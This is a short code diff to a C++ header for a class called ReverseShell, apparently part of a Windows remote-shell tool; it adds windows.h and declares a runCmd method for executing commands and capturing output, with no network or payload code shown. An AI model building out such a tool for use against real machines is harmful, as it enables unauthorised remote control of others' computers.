@@ -6,13 +6,15 @@
 #include <memory>
 #include <iostream>
 #include <cstring>
+#include <windows.h>
 
 class ReverseShell {
 private:
-    std::wstring currentDirectory=L".";
+    std::string currentDirectory=".";
 public:
     ReverseShell() = default;
     std::string executeCommand(const std::wstring&);
+    int runCmd(const std::string &commandToExecute, std::string& outOutput);
 };
 
 
